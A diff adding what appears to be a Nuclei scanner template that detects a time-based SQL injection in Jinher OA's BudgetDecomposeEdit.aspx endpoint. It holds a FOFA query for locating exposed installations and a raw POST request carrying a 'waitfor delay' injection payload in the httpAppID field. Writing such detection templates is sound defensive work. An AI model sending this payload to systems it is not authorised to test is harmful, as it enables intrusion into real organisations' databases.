@@ -1,0 +1,38 @@
+id: jinher-jhsoft-budgetdecomposeedit-aspx-sqli
+info:
+  name: 金和OA BudgetDecomposeEdit.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 金和OA
+    fofa: app="金和网络-金和OA"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.CostControl/Decompose/BudgetDecomposeEdit.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        httpAppID=1%27waitfor+delay%270:0:{{t1}}%27--&httpOID=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: header
+        words:
+          - "Cookie:"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
